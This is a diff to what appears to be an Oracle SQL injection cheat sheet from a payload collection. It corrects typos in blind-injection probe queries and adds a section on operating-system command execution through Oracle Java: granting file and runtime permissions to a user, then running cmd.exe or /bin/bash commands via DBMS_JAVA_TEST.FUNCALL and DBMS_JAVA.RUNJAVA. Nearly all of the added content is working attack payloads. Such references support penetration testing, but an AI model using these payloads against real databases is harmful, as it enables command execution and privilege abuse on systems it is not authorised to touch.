@@ -68,8 +68,8 @@ SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE '%PASS%';
 | Version is 12.2	       | SELECT COUNT(*) FROM v$version WHERE banner LIKE 'Oracle%12.2%'; |
 | Subselect is enabled	 | SELECT 1 FROM dual WHERE 1=(SELECT 1 FROM dual) |
 | Table log_table exists | SELECT 1 FROM dual WHERE 1=(SELECT 1 from log_table); |
-| Column message exists in table log_table | SELEC COUNT(*) FROM user_tab_cols WHERE column_name = 'MESSAGE' AND table_name = 'LOG_TABLE'; |
-| First letter of first message is t | SELEC message FROM log_table WHERE rownum=1 AND message LIKE 't%'; |
+| Column message exists in table log_table | SELECT COUNT(*) FROM user_tab_cols WHERE column_name = 'MESSAGE' AND table_name = 'LOG_TABLE'; |
+| First letter of first message is t | SELECT message FROM log_table WHERE rownum=1 AND message LIKE 't%'; |
 
 ## Oracle SQL Time based
 
@@ -77,9 +77,36 @@ SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE '%PASS%';
 AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])                 comment:   -- /**/
 ```
 
-## Oracle SQL Command execution
+## Oracle SQL Command Execution
 
 * [ODAT (Oracle Database Attacking Tool)](https://github.com/quentinhardy/odat)
+
+### Oracle Java Execution
+
+* List Java privileges
+    ```sql
+    select * from dba_java_policy
+    select * from user_java_policy
+    ```
+* Grant privileges
+    ```sql
+    exec dbms_java.grant_permission('SCOTT', 'SYS:java.io.FilePermission','<<ALL FILES>>','execute');
+    exec dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission', 'writeFileDescriptor', '');
+    exec dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission', 'readFileDescriptor', '');
+    ```
+* Execute commands
+    * 10g R2, 11g R1 and R2: `DBMS_JAVA_TEST.FUNCALL()`
+    ```sql
+    SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','c:\\windows\\system32\\cmd.exe','/c', 'dir >c:\test.txt') FROM DUAL
+    SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','/bin/bash','-c','/bin/ls>/tmp/OUT2.LST') from dual
+    ```
+    * 11g R1 and R2: `DBMS_JAVA.RUNJAVA()`
+    ```sql
+    SELECT DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper /bin/bash -c /bin/ls>/tmp/OUT.LST') FROM DUAL
+    ```
+
+
+### Oracle Java Class
 
 ```sql
 /* create Java class */
@@ -110,4 +137,7 @@ SELECT PwnUtilFunc('ping -c 4 localhost') FROM dual;
 
 ## References
 
-* [Heavily taken inspired by - NetSpi SQL Wiki](https://sqlwiki.netspi.com/injectionTypes/errorBased/#oracle)
+* [NetSpi - SQL Wiki](https://sqlwiki.netspi.com/injectionTypes/errorBased/#oracle)
+* [ASDC12 - New and Improved Hacking Oracle From Web](https://owasp.org/www-pdf-archive/ASDC12-New_and_Improved_Hacking_Oracle_From_Web.pdf)
+* [Pentesting Oracle TNS Listener - HackTricks](https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener)
+* [ODAT: Oracle Database Attacking Tool](https://github.com/quentinhardy/odat/wiki/privesc)
